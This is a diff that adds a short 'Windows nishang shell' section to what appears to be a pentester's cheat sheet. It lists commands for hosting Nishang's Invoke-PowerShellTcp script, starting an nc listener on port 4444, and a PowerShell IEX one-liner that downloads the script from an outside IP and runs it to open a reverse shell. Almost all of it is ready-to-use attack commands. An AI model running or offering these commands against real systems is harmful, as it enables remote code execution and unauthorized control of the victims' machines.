@@ -54,3 +54,15 @@ stty -rows 48 -columns 120
 
 python -m simpleHTTPServer
 
+# Windows nishang shell
+
+Linux Site:
+gedit Invoke-PowerShellTcp.ps1 (Invoke-PowerShellTcp -Reverse -IPAdress 192.168.1.32 -Port 4444
+python -m SimpleHTTPServer
+nc -lvp 4444
+
+Windows Site:
+C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1')
+
+
+
